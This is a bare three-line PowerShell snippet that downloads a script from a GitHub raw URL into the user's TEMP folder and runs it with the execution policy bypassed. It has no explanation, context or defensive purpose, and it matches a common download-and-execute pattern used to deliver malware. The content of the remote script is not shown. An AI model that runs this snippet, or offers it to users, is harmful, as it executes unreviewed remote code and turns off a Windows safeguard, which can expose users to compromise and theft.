$scriptPath = "$env:TEMP\script.ps1"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/stormdiscordsoon-ship-it/script-ps1/main/script.ps1" -OutFile $scriptPath
powershell.exe -ExecutionPolicy Bypass -File $scriptPath
